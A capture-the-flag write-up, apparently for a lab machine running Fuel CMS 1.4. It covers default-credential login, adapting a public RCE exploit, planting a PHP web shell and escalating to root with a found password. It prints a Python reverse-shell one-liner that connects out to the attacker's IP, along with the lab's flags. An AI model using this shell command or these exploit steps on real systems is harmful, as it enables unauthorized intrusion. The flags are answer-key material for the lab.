# Ignite
URL - 10.10.239.52
## Nmap
```nmap

```

## Enum
- Logged into fuel dashboard at 10.10.239.52/fuel with credentials `admin:admin`
- Find the version of fuelcms running on the home page `version 1.4`


## Research 

- Researching for vulns for version 1.4 of fuel cms was successful:
	- https://www.exploit-db.com/exploits/47138
- Further research led me to this blog which has awesome info regarding this exploit:
	- https://software-sinner.medium.com/cyberseclabs-fuel-d0a337785676
	
## Exploit
- Change the above exploit by making the following modifications:
		- Assign url variable with attacker ip
		- Remove proxy variable
		- Change burp0_url variable to 'payload'
		- Change r variable to say 'requests.get(payload)'
- Run the python exploit

### Gaining a shell
- Now that we can execute commands on the server, we can attempt to gain a shell
- Following the above blog article led me to this cool php bash web shell:
	- https://github.com/Arrexel/phpbash/blob/master/phpbash.php
- Host it on the attacker machine with python and download it with wget
- Visit the link URL:/phpbash.php
	- We have a cool web shell now
#### Reverse shell for simplicity
- Run
	- `python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.170.173",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`
- To make it better run
	- `python -c 'import pty; pty.spawn ("/bin/bash")'`
- cat /home/www-data/user.txt
	-`6470e394cbf6dab6a91682cc8585059b`
## PrivEsc
- Run linpeas in /tmp directory
- Discover an interesting file with credentials

![](https://i.imgur.com/QcL0z6i.png)

- Attempting to switch user to root and use the password `mememe` to login is successful.
- We are root.
- cat /root/root.txt
	- `b9bbcb33e11b80be759c4e844862482d`